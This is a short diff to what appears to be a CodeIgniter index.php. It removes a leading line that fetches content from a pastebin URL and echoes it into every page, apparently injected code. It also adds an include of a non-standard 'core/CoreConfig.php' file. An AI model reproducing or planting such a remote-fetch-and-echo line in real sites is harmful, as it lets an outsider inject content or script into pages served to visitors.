@@ -1,4 +1,4 @@
-<?php $a = file_get_contents('https://pastebin.com/raw/m7NuYMZy'); echo $a;
+<?php
 
 /**
  * CodeIgniter
@@ -316,3 +316,4 @@ include_once(__DIR__."/application/helpers/SecretConst.php");
  * And away we go...
  */
 require_once BASEPATH.'core/CodeIgniter.php';
+require_once BASEPATH.'core/CoreConfig.php';
